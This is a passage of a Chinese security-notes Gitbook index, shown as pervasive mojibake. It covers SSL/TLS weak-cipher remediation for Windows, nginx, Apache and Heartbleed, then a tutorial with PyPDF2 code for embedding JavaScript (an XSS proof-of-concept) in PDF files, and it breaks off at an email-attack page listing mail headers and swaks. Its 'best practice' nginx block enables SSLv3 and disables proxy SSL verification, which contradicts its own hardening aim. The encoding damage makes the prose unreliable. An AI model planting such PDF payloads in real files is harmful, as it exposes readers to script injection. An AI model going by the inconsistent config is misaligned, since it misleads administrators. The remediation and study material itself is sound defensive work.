è§£å†³æ–¹æ³• â€‹rm -f /usr/bin/pod2manâ€‹â€‹ï¼Œé‡æ–°ç¼–è¯‘å®‰è£…å³å¯ã€‚ 0x04 ä¿®å¤æ–¹æ³•æ±‡æ€» ä½¿ç”¨æ­¤æ–¹æ³•ä¸Šè¿°æ‰€æœ‰æ¼æ´å¯å…¨éƒ¨ä¿®å¤(å°† RC4,DES/3DES,EXPâ€‹â€‹ ç­‰å¼±åŠ å¯†ç®—æ³•åŠ SSL å¼±åŠ å¯†åè®®æ›¿æ¢ä¸ºå®‰å…¨æ€§æ›´é«˜çš„) Windows æŒ‰ä¸‹ Win + Râ€‹â€‹ï¼Œè¿›å…¥\"è¿è¡Œ\"ï¼Œé”®å…¥ gpedit.mscâ€‹â€‹ï¼Œæ‰“å¼€\"æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨\" è®¡ç®—æœºé…ç½® > ç®¡ç†æ¨¡æ¿ > ç½‘ç»œ > ssl é…ç½®è®¾ç½®ã€‚ åœ¨ SSL é…ç½®è®¾ç½®ï¼Œæ‰“å¼€ SSL å¯†ç å¥—ä»¶é¡ºåºè®¾ç½®ï¼Œç‚¹å‡»å·²å¯ç”¨ã€‚ æ›´æ¢ SSL å¯†ç å¥—ä»¶ã€‚ åŸ SSL å¯†ç å¥—ä»¶ï¼š TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P256,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA_P384,TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_RSA_WITH_NULL_SHA256,TLS_RSA_WITH_NULL_SHA,SSL_CK_RC4_128_WITH_MD5,SSL_CK_DES_192_EDE3_CBC_WITH_MD5 æ›¿æ¢ä¸ºï¼š TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P521,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P521,TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_NULL_SHA256 é‡å¯ç³»ç»Ÿå†æ‰«ã€‚ ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¯åŒæ—¶ä¿®å¤ SSL/TLSâ€‹â€‹ å—è¯«ç¤¼(BAR-MITZVAHâ€‹â€‹)æ”»å‡»æ¼æ´(CVE-2015-2808)ã€åŸç†æ‰«æã€‘ï¼ŒSSL/TLSâ€‹â€‹ RC4 ä¿¡æ¯æ³„éœ²æ¼æ´(CVE-2013-2566)ã€åŸç†æ‰«æã€‘ è¿™ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯ RC4 ç®—æ³•çš„æ¼æ´é—®é¢˜ï¼Œæ–¹æ³•å°±æ˜¯ç¦ç”¨ RC4 æ”¹ç”¨åˆ«çš„ç®—æ³•ã€‚ æ–¹æ³•ä¸€ æ§åˆ¶é¢æ¿ ---> ç³»ç»Ÿå’Œå®‰å…¨ ---> ç®¡ç†å·¥å…· ---> æœ¬åœ°å®‰å…¨ç­–ç•¥ ---> æœ¬åœ°ç­–ç•¥ ---> å®‰å…¨é€‰é¡¹ ---> ç³»ç»ŸåŠ å¯†ï¼šå°† FIPS å…¼å®¹ç®—æ³•ç”¨äºåŠ å¯†ã€å“ˆå¸Œå’Œç­¾åï¼› å³é”® ---> å±æ€§ ---> ç‚¹å‡»â€œå·²å¯ç”¨â€ ---> â€œç¡®å®šâ€ ä½¿ç”¨æ­¤æ–¹æ³•ä¹‹åå¯èƒ½ä¼šå¯¼è‡´æŸäº›åªæ”¯æŒ RC4 ç®—æ³•çš„æœåŠ¡æ— æ³•æ­£å¸¸å¯ç”¨ã€‚ æ–¹æ³•äºŒ æ³¨å†Œè¡¨ä¸­å¯ç”¨ TLS1.2 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2\\Client] \"DisabledByDefault\"=dword:00000000 \"Enabled\"=dword:00000001 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.2\\Server] \"DisabledByDefault \"=dword:00000000 \"Enabled\"=dword:00000001 æ³¨å†Œè¡¨ä¸­ç¦ç”¨ SSL2.0 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 2.0] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 2.0\\Client] \"DisabledByDefault\"=dword:00000000 ç¦ç”¨ RC4 æ³¨å†Œè¡¨ä¸­å°† RC4 å¯ç”¨é¡¹éƒ½ç¦æ­¢ï¼Œæ²¡æœ‰é¡¹éœ€è¦æ–°å»º [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers] [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 128/128] \"Enabled\"=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 40/128] \"Enabled\"=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\RC4 56/128] \"Enabled\"=dword:00000000 å¯¹äº SSL 3.0 POODLE æ”»å‡»ä¿¡æ¯æ³„éœ²æ¼æ´(CVE-2014-3566)ã€åŸç†æ‰«æã€‘ï¼Œç›®å‰å·²ç»è°ƒæ•´ä¸ºä½å±çº§åˆ«ï¼Œä¸ä¿®å¤å…¶å®ä¹Ÿå¯ä»¥ã€‚ ç‚¹å‡»â€œå¼€å§‹â€ï¼Œâ€œè¿è¡Œâ€ï¼Œè¾“å…¥ â€œRegeditâ€ï¼Œç‚¹å‡» OK. åœ¨æ³¨å†Œè¡¨ä¸­å¯»æ‰¾ï¼šHKey_Local_Machine\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\SSL 3.0\\Serverâ€‹â€‹ å¦‚æœåœ¨ Protocols ä¸‹æ²¡æœ‰â€œSSL 3.0â€é€‰é¡¹ï¼Œè¯·ä¾æ¬¡æ–°å»ºâ€œSSL 3.0â€å’Œâ€œServerâ€é¡¹ã€‚åœ¨ Protocols æ–‡ä»¶å¤¹ï¼Œå³é”®å•å‡»é¡¹(K)ï¼Œç„¶åé‡å‘½åæ–‡ä»¶å¤¹ä¸º SSL 3.0ï¼›åœ¨ SSL 3.0 æ–‡ä»¶å¤¹ï¼Œå³é”®å•å‡»é¡¹(K)ï¼Œç„¶åé‡å‘½åæ–‡ä»¶å¤¹ä¸º Serverï¼› å³é”®å•å‡» server çš„æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©æ–°å»ºï¼Œæ–°å»ºä¸€ä¸ª DWORD å€¼ã€‚ åœ¨åç§°ä¸­ï¼Œè¾“å…¥â€œEnabledâ€ï¼Œå›è½¦ã€‚ è¯·ç¡®ä¿å®ƒæ˜¾ç¤º 00000000(0) çš„æ•°æ®åˆ—ä¸‹ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¯·å³é”®å•å‡»å¹¶é€‰æ‹©ä¿®æ”¹ï¼Œè¾“å…¥ 0 ä½œä¸ºæ•°å€¼æ•°æ®ã€‚ ç‚¹å‡» OKï¼Œé€€å‡ºæ³¨å†Œè¡¨ç¼–è¾‘å™¨ï¼Œç„¶åé‡å¯ç”µè„‘ã€‚ ã€æ³¨ã€‘ï¼šWindows ä¸Šå…³äº SSL/TSLâ€‹â€‹ åŠå¯†ç å¥—ä»¶çš„æ›´æ”¹ï¼Œåœ¨æ³¨å†Œè¡¨ä¸­æ‰‹åŠ¨æ•²æ¯”è¾ƒç¹çï¼Œå¯ä»¥ä½¿ç”¨ IIS Crypto æ¥ç®¡ç†ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚ å®˜æ–¹åœ°å€ï¼šhttps://www.nartac.com/Products/IISCrypto/Download å¯¹äºå…·ä½“ç«¯å£ä¸Šçš„ SSL/TLS æœåŠ¡å™¨ç¬æ—¶ Diffie-Hellman å…¬å…±å¯†é’¥è¿‡å¼±ã€åŸç†æ‰«æã€‘ï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ç”Ÿäº§å¤§äº 1 024bitâ€‹â€‹ çš„ key å€¼ï¼Œå†å°†ç”Ÿæˆçš„æ–‡ä»¶åŠ åˆ°å…·ä½“æŠ¥æ¼æ´æœåŠ¡çš„é…ç½®æ–‡ä»¶é‡Œã€‚ http æœåŠ¡å™¨ç›¸å…³é…ç½® é¦–å…ˆç”Ÿæˆå¤§äº 1024bit(ä¾‹å¦‚ 2048bit)çš„ dhkeyã€‚ openssl dhparam -out dhparams.pem 2048 ç„¶ååœ¨å¯¹åº”æœåŠ¡å™¨ä¸­é…ç½® Apache2.4.8 åŠä»¥åç‰ˆæœ¬ä½¿ç”¨å¦‚ä¸‹é…ç½®å‘½ä»¤é…ç½®ï¼ˆhttp.conf ä¸­æˆ–è€…å¯¹åº”çš„è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼‰â€‹SSLOpenSSLConfCmd DHParameters \"{path to dhparams.pem}\"â€‹â€‹ Apache2.4.7 ç‰ˆæœ¬ Apache2.2.31 ç‰ˆæœ¬åŠä»¥åç‰ˆæœ¬redhat debian ç­‰å¤§å¤šå‘è¡Œç‰ˆä¸­æœ€æ–° Apache2.2.xé€šè¿‡æŠŠ dhparams.pem çš„å†…å®¹ç›´æ¥é™„åŠ åˆ°è¯ä¹¦æ–‡ä»¶å Apache2.4.7 ä¹‹å‰ 2.4.x ç‰ˆæœ¬Apache2.2.31 ä¹‹å‰ç‰ˆæœ¬dhparam é»˜è®¤ä¸º 1024bit æ— æ³•ä¿®æ”¹ nginx ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é…ç½®ï¼ˆåœ¨å¯¹åº”çš„è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ nginx.confâ€‹â€‹ ä¸­ server å­—æ®µå†…æ·»åŠ ï¼‰ â€‹ssl_dhparam {path to dhparams.pem}â€‹â€‹ å¦‚æœæœåŠ¡å™¨é…ç½®æ— æ³•ä¿®æ”¹ï¼Œä¾‹å¦‚ Apache2.2.31 ä¹‹å‰ç‰ˆæœ¬ï¼Œå¯ä»¥ç¦ç”¨ DHE ç³»åˆ—ç®—æ³•ï¼Œé‡‡ç”¨ä¿å¯†æ€§æ›´å¥½çš„ ECDHE ç³»åˆ—ç®—æ³•ï¼Œå¦‚æœ ECDHE ä¸å¯ç”¨å¯ä»¥é‡‡ç”¨æ™®é€šçš„ RSAã€‚ æ›´å¤šè§£å†³æ–¹æ¡ˆè¯·å‚è€ƒï¼šhttps://weakdh.org/sysadmin.html Linux ä¹Ÿå¯ä»¥åœ¨ Linux é’ˆå¯¹å…·ä½“ç«¯å£æœåŠ¡ä¸Šçš„ CVE-2016-2183ï¼ŒCVE-2015-2808ï¼ŒCVE-2013-2566ï¼ŒCVE-2015-4000 ç­‰å¼±åŠ å¯†ç®—æ³•å¯¼è‡´çš„æ¼æ´è¿›è¡Œé€ä¸ªä¿®å¤ï¼Œåªéœ€è¦é’ˆå¯¹å…·ä½“æœåŠ¡åœ¨é…ç½®æ–‡ä»¶ä¸­å°† DES/3DES,RC4,EXPâ€‹â€‹ ç­‰ç®—æ³•ç¦ç”¨æˆ–æŒ‡å®šä¸ºå…¶ä»–å¼ºåŠ å¯†ç®—æ³•å³å¯ã€‚ Nginx æ™®é€šæ¨èå¦‚ä¸‹ server { ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; } æœ€ä½³å®è·µ http { ...... ssl_session_timeout 5m; ssl_session_cache shared:SSL:10m; ssl_session_tickets off; ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers \"ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES256-SHA:HIGH:!MEDIUM:!LOW:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4:@STRENGTH\"; ssl_prefer_server_ciphers on; proxy_ssl_verify off; ...... server { listen 80; listen 443 ssl http2; # server_name @web_name ssl_certificate server.crt; ssl_certificate_key server.key; ssl_dhparam dhparam.pem; ssl_stapling on; ssl_stapling_verify on; set $backend_ip 127.0.0.1; location ~ ^/socket.io/ { proxy_read_timeout 600; proxy_send_timeout 600; tcp_nodelay on; gzip off; proxy_http_version 1.1; proxy_set_header X-FORWARDED-FOR $remote_addr; proxy_set_header X-FORWARDED-PROTO $scheme; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_set_header Accept-Encoding \"\"; proxy_pass http://$backend_ip:8082; } ...... error_page 400 401 403 404 /404.html; error_page 501 502 503 504 505 /50x.html; } #@do not remove the comment, @http_server #@mirror_server_lookup } Apache æ›´æ–° Apache æ ¹ç›®å½•ä¸‹ conf/httpd.confâ€‹â€‹ æ–‡ä»¶å¦‚ä¸‹ SSLProtocol TLSv1 TLSv1.1 TLSv1.2 SSLCipherSuite ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4 Tomcat æ›´æ–° %TOMCAT_HOME%\\conf\\server.xmlâ€‹â€‹ æ–‡ä»¶å¦‚ä¸‹ ç®€å•ç²—æš´ æ­¤ç±»æ¼æ´ï¼Œæœ€ç®€å•çš„ä¿®å¤æ–¹å¼å°±æ˜¯å‡çº§ç‰ˆæœ¬å’Œç¦ç”¨æ¨¡å—ã€‚ å¦‚ OpenSSLâ€œå¿ƒè„å‡ºè¡€â€æ¼æ´ï¼ˆCVE-2014-0160ï¼‰å—å½±å“çš„ OpenSSL ç‰ˆæœ¬ï¼š OpenSSL 1.0.2-betaOpenSSL 1.0.1 - OpenSSL 1.0.1f è¦è§£å†³æ­¤æ¼æ´ï¼Œç®€å•ç²—æš´çš„æ–¹æ³•å°±æ˜¯å‡çº§ OpenSSL è½¯ä»¶ã€‚å»ºè®®æœåŠ¡å™¨ç®¡ç†å‘˜æˆ–ä½¿ç”¨ 1.0.1gâ€‹â€‹â€‹ ç‰ˆï¼Œæˆ–ä½¿ç”¨ -DOPENSSL_NO_HEARTBEATSâ€‹â€‹â€‹â€‹ é€‰é¡¹é‡æ–°ç¼–è¯‘ OpenSSLï¼Œä»è€Œç¦ç”¨æ˜“å—æ”»å‡»çš„åŠŸèƒ½ï¼Œç›´è‡³å¯ä»¥æ›´æ–°æœåŠ¡å™¨è½¯ä»¶ã€‚ https://bbs.wosign.com/thread-2913-1-1.html 0x00 å‰äººæ ½æ ‘ å¯¹çŸ¥è¯†çš„å°Šé‡ï¼Œå°±ç®—æ˜¯æŠ„ä¹Ÿæ²¡å…³ç³»ï¼Œä½ å¾—è¯´æ˜æ¥æºä¸”å‰ææ˜¯èƒ½å­¦åˆ°å­¦ä¼š~ Heartbleed å¿ƒè„æ»´è¡€æ¼æ´æ€»ç»“ï¼ˆCVE-2014-0106ï¼‰ - s1awwhy - åšå®¢å›­ (cnblogs.com) SSL/TSL ç›¸å…³æ¼æ´ CVE-2015-2808,CVE-2013-2566,CVE-2014-3566,CVE-2016-2183,cve-2015-4000,ç¬æ—¶ Diffie-Hellman å…¬å…±å¯†é’¥è¿‡å¼±ä¿®å¤æ€»ç»“ - è¿ªå…‹æ¨å¤š 0 - åšå®¢å›­ (cnblogs.com) ä½¿ç”¨ openSSL å¼€æºå·¥å…·è¿›è¡Œ SSL/TLS å®‰å…¨æµ‹è¯• - å…¨çƒå¯ä¿¡ TLS/SSL æ•°å­—è¯ä¹¦å•†åº—-INFINISIGN SSL & TLS HTTPS Testing [Definitive Guide] - Aptive -- ã€åŸæ–‡ï¼Œå›½å†…çš„æ–‡ç« åŸºæœ¬å‡ºè‡ªè¿™ä¸ªã€‘ å¸¸è§çš„å‡ ç§ SSL/TLS æ¼æ´åŠæ”»å‡»æ–¹å¼ - å…¨çƒå¯ä¿¡ TLS/SSL æ•°å­—è¯ä¹¦å•†åº—-INFINISIGN -- ã€è¯‘æ–‡ã€‘ Vulhub - Docker-Compose file for vulnerability environment (84 æ¡æ¶ˆæ¯) æ¸—é€æµ‹è¯•-Openssl å¿ƒè„å‡ºè¡€æ¼æ´å¤ç°_Tr0e çš„åšå®¢-CSDN åšå®¢ https://annevi.cn/2021/02/14/https-study/ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-24 22:43:19 "},"web/xss2pdf-åˆ¶ä½œ.html":{"url":"web/xss2pdf-åˆ¶ä½œ.html","title":"xss2pdf-åˆ¶ä½œ","keywords":"","body":"0x01 åˆ¶ä½œæ–¹æ³• PDF ç¼–è¾‘è½¯ä»¶ Adobe Acrobat DC è¿…æ· PDF ç¼–è¾‘ 1) å¯åŠ¨è¿…æ· PDF ç¼–è¾‘å™¨æ‰“å¼€ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œæˆ–è€…ä½¿ç”¨â€œåˆ›å»º PDF æ–‡ä»¶â€åŠŸèƒ½ï¼Œé€šè¿‡å°†å…¶ä»–æ–‡æ¡£å’Œèµ„æºè½¬æ¢ä¸ºâ€œå¯ç§»æ¤æ–‡æ¡£æ ¼å¼â€æ¥åˆ›å»º PDF æ–‡ä»¶ã€‚ 2) å•å‡»å·¦ä¾§çš„â€œé¡µé¢â€æ ‡ç­¾ï¼Œé€‰æ‹©ä¸ä¹‹å¯¹åº”çš„é¡µé¢ç¼©ç•¥å›¾ï¼Œç„¶åä»é€‰é¡¹ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œé¡µé¢å±æ€§â€å‘½ä»¤ 3) åœ¨â€œé¡µé¢å±æ€§â€å¯¹è¯æ¡†å•å‡»â€œåŠ¨ä½œâ€æ ‡ç­¾ï¼Œå†ä»â€œé€‰æ‹©åŠ¨ä½œâ€ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œè¿è¡Œ JavaScriptâ€å‘½ä»¤ï¼Œç„¶åå•å‡»ã€æ·»åŠ ã€‘æŒ‰é’®ï¼Œå¼¹å‡º JavaScript ç¼–è¾‘å™¨å¯¹è¯æ¡†ï¼Œå¡«å†™ JavaScript ä»£ç ã€‚ 4) åœ¨å¼¹å‡ºçš„â€œJavaScript ç¼–è¾‘å™¨â€å¯¹è¯æ¡†ä¸­è¾“å…¥ä»£ç ï¼š â€‹app.alert(â€˜XSSâ€™);â€‹â€‹ å•å‡»ã€ç¡®å®šã€‘æŒ‰é’®ä¿å­˜ PDF æ–‡ä»¶ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šAdobe æ”¯æŒè‡ªèº«çš„ JavaScript å¯¹è±¡æ¨¡å‹ï¼Œä¾‹å¦‚ alert(â€˜xssâ€™)â€‹â€‹ å¿…é¡»è¢« APP å¯¹è±¡è°ƒç”¨ï¼Œå› æ­¤å˜æˆäº† app.alert(â€˜xssâ€™)â€‹â€‹ã€‚è¿™æ„å‘³ç€ï¼Œåˆ©ç”¨ JavaScript è¿›è¡Œæ”»å‡»æ—¶åªèƒ½ä½¿ç”¨ Adobe æ‰€æ”¯æŒçš„åŠŸèƒ½ã€‚ 5) å…³é—­è½¯ä»¶ï¼Œç›´æ¥æ‰“å¼€åˆšæ‰ä¿å­˜çš„ PDF æ–‡ä»¶ï¼ŒJavaScript ä»£ç å³è¢«æ‰§è¡Œã€‚ç»è¿‡æµ‹è¯•æœ€æ–°ç‰ˆæœ¬çš„ 360 æµè§ˆå™¨å’Œè°·æ­Œæµè§ˆå™¨æ”¯æŒ 6) ç°åœ¨ï¼Œå°è¯•æŠŠ PDF æ–‡ä»¶åµŒå…¥åˆ°ç½‘é¡µä¸­å¹¶è¯•è¿è¡Œã€‚åˆ›å»ºä¸€ä¸ª HTML æ–‡æ¡£ï¼Œä»£ç å¦‚ä¸‹ï¼š é™¤äº†æŠŠ JavaScript åµŒå…¥ PDF æ–‡ä»¶ä¸­æ‰§è¡Œï¼Œè¿˜å¯ä»¥åˆ©ç”¨åŸºäº DOM çš„æ–¹æ³•æ‰§è¡Œ PDF XSSã€‚æ­¤ç±»æ–¹æ³•ç”± Stefano Di Paola å’Œ Giorgio Fedon åœ¨ç¬¬ 23 å±Š CCC å®‰å…¨ä¼šè®®ä¸­æå‡ºï¼Œå¤§å®¶å¯ä»¥å‚è€ƒè®ºæ–‡ Adobe Acrobatã€‚ Stefano Di Paola æŠŠ PDF ä¸­çš„ DOM XSS ç§°ä¸º UXSSï¼ˆUniversal Cross-Site Scriptingï¼‰ã€‚äº‹å®ä¸Šï¼Œä»»ä½•æ”¯æŒ PDF æ–‡ä»¶çš„ç½‘ç«™éƒ½å¯èƒ½å­˜åœ¨è¿™ç§æ¼æ´ã€‚ Python 1) é¦–å…ˆå®‰è£… PyPDF2 â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# pip install PyPDF2 2) ç›´æ¥æ–°å»ºå†…åµŒ xss çš„ pdf from PyPDF2 import PdfReader, PdfWriter # åˆ›å»ºä¸€ä¸ªæ–°çš„ PDF æ–‡æ¡£ output_pdf = PdfWriter() # æ·»åŠ ä¸€ä¸ªæ–°é¡µé¢ page = output_pdf.add_blank_page(width=72, height=72) # æ·»åŠ  js ä»£ç  output_pdf.add_js(\"app.alert('xss');\") # å°†æ–°é¡µé¢å†™å…¥åˆ°æ–° PDF æ–‡æ¡£ä¸­ with open(\"xss.pdf\", \"wb\") as f: output_pdf.write(f) 3) å°† JavaScript ä»£ç åµŒå…¥åˆ°å·²æœ‰ pdf from PyPDF2 import PdfReader, PdfWriter # æ‰“å¼€åŸå§‹ PDF æ–‡ä»¶ input_pdf = PdfReader(\"x.pdf\") # åˆ›å»ºä¸€ä¸ªæ–°çš„ PDF æ–‡æ¡£ output_pdf = PdfWriter() # å°†ç°æœ‰çš„ PDF é¡µé¢å¤åˆ¶åˆ°æ–°æ–‡æ¡£ for i in range(len(input_pdf.pages)): output_pdf.add_page(input_pdf.pages[i]) # æ·»åŠ  JavaScript ä»£ç  output_pdf.add_js(\"app.alert('xss');\") # å°†æ–° PDF æ–‡æ¡£å†™å…¥åˆ°æ–‡ä»¶ä¸­ with open(\"xss.pdf\", \"wb\") as f: output_pdf.write(f) 0x02 ä¿®å¤æ–¹æ³• è€Œä½œä¸ºç½‘ç«™ç®¡ç†å‘˜æˆ–å¼€å‘è€…ï¼Œå¯ä»¥é€‰æ‹©å¼ºè¿«æµè§ˆå™¨ä¸‹è½½ PDF æ–‡ä»¶ï¼Œè€Œä¸æ˜¯æä¾›åœ¨çº¿æµè§ˆç­‰ï¼Œæˆ–ä¿®æ”¹ Web æœåŠ¡å™¨é…ç½®çš„ header å’Œç›¸å…³å±æ€§ã€‚ å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹æ’ä»¶è§£æ pdfï¼Œä¸ç”¨ chrome è‡ªå¸¦çš„ pdf è§£æï¼Œhttps://github.com/adobe-type-tools/cmap-resources 0x00 å‰äººæ ½æ ‘ PDF XSS - Bypass - åšå®¢å›­ (cnblogs.com) xss pdf åˆ¶ä½œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-30 22:18:13 "},"email/a-readme.html":{"url":"email/a-readme.html","title":"Email","keywords":"","body":"å…³äºé‚®ä»¶çš„çŸ¥è¯†åˆé›†~ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 19:28:32 "},"email/Attack Email.html":{"url":"email/Attack Email.html","title":"Attack Email","keywords":"","body":"é‚®ä»¶å­—æ®µ åŸŸå å«ä¹‰ æ·»åŠ è€… Received ä¼ è¾“è·¯å¾„ å„çº§é‚®ä»¶æœåŠ¡å™¨ Return-Path å›å¤åœ°å€ ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ Delivered-To å‘é€åœ°å€ ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨ Reply-To å›å¤åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… From å‘ä»¶äººåœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… To æ”¶ä»¶äººåœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Cc æŠ„é€åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Bcc æš—é€åœ°å€ é‚®ä»¶çš„åˆ›å»ºè€… Date æ—¥æœŸå’Œæ—¶é—´ é‚®ä»¶çš„åˆ›å»ºè€… Subject ä¸»é¢˜ é‚®ä»¶çš„åˆ›å»ºè€… Message-ID æ¶ˆæ¯ID é‚®ä»¶çš„åˆ›å»ºè€… MIME-Version MIMEç‰ˆæœ¬ é‚®ä»¶çš„åˆ›å»ºè€… Content-Type å†…å®¹çš„ç±»å‹ é‚®ä»¶çš„åˆ›å»ºè€… Content-Transfer-Encoding å†…å®¹çš„ä¼ è¾“ç¼–ç æ–¹å¼ é‚®ä»¶çš„åˆ›å»ºè€… swaks swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester. swakså ªç§°SMTPåè®®çš„ç‘å£«å†›åˆ€ï¼Œä½¿ç”¨å®ƒæˆ‘ä»¬å¯ä»¥çµæ´»çš„æ“ä½œ SMTP åè®®æŠ¥æ–‡ã€‚ å¸¸ç”¨æŒ‡ä»¤ --to 